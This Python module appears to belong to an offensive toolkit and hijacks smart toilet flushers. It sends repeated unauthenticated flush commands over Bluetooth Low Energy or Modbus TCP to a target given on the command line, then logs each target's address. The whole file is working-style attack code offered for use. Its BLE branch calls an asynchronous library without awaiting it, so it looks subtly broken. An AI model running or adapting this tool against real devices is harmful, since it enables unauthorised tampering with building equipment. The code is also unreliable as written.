# modules/exploits/toilet_flusher_hijack.py

import argparse
import time
import json
import os
from datetime import datetime

try:
    import bleak  # For BLE
except ImportError:
    bleak = None

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0851"  # IoT Device Exploitation (custom tactic for embedded devices)

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def flush_ble(mac_address, characteristic_uuid, delay, repeat):
    if not bleak:
        print("[!] BLE support not available. Install `bleak` library.")
        return
    from bleak import BleakClient

    for i in range(repeat):
        try:
            print(f"[i] Connecting to BLE toilet controller: {mac_address}")
            client = BleakClient(mac_address)
            client.connect()
            client.write_gatt_char(characteristic_uuid, b"FLUSH")
            print(f"[✓] Flush command sent ({i+1}/{repeat})")
            time.sleep(delay)
            client.disconnect()
        except Exception as e:
            print(f"[!] BLE flush failed: {e}")
            break

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target_mac": mac_address,
        "method": "BLE",
        "uuid": characteristic_uuid,
        "repeat": repeat,
        "delay": delay,
        "ttp": MITRE_TTP
    })

def flush_modbus(ip, port, unit_id, coil_address, delay, repeat):
    try:
        from pymodbus.client.sync import ModbusTcpClient
    except ImportError:
        print("[!] pymodbus not installed. Install it via `pip install pymodbus`.")
        return

    client = ModbusTcpClient(ip, port=port)
    if not client.connect():
        print("[!] Modbus connection failed")
        return

    for i in range(repeat):
        result = client.write_coil(coil_address, True, unit=unit_id)
        if result.isError():
            print(f"[!] Modbus flush failed ({i+1}/{repeat})")
        else:
            print(f"[✓] Flush command sent over Modbus ({i+1}/{repeat})")
        time.sleep(delay)

    client.close()

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "port": port,
        "method": "Modbus",
        "unit_id": unit_id,
        "coil": coil_address,
        "repeat": repeat,
        "delay": delay,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Toilet Flusher Hijack (BLE/Modbus)")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    ble = subparsers.add_parser("ble", help="BLE Mode")
    ble.add_argument("--mac", required=True, help="BLE MAC address of the flusher")
    ble.add_argument("--uuid", required=True, help="BLE characteristic UUID for flush")
    ble.add_argument("--delay", type=float, default=1.0)
    ble.add_argument("--repeat", type=int, default=1)

    modbus = subparsers.add_parser("modbus", help="Modbus Mode")
    modbus.add_argument("--ip", required=True, help="Target IP")
    modbus.add_argument("--port", type=int, default=502)
    modbus.add_argument("--unit-id", type=int, default=1)
    modbus.add_argument("--coil", type=int, required=True)
    modbus.add_argument("--delay", type=float, default=1.0)
    modbus.add_argument("--repeat", type=int, default=1)

    args = parser.parse_args()

    if args.mode == "ble":
        flush_ble(args.mac, args.uuid, args.delay, args.repeat)
    elif args.mode == "modbus":
        flush_modbus(args.ip, args.port, args.unit_id, args.coil, args.delay, args.repeat)
